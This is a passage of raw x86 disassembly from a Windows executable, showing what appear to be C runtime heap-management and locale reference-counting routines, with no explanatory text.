  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
